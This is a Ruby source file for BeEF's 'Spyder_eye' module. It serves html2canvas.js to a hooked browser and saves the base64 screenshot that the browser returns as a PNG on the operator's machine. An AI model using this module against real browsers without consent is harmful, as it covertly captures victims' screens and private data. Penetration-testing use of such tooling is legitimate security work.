#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Spyder_eye < BeEF::Core::Command
  require 'base64'

  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/browser/spyder_eye/html2canvas.js', '/html2canvas', 'js')
  end

  def post_execute 
    content = {}
    content['results'] = @datastore['results']
    save content
    #I would prefer use common logger but I haven't find the way to do it
    # print "---------[ preth00nker says ]----------\n"
      print_status("Browser screenshot saved to './beef/"+"SeO_"+@datastore['cid']+".png'\n")
    #e.g. BeEF::Core::Logger.instance.register("spyder eye"," look for your file in ./beef/"+"SeO_"+@datastore['cid']+".png")
    File.open("SeO_"+@datastore['cid']+'.png', 'wb') do |file| 
      file.write(Base64.decode64( content['results'] ) ) 
    end

    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/html2canvas.js')
  end

end

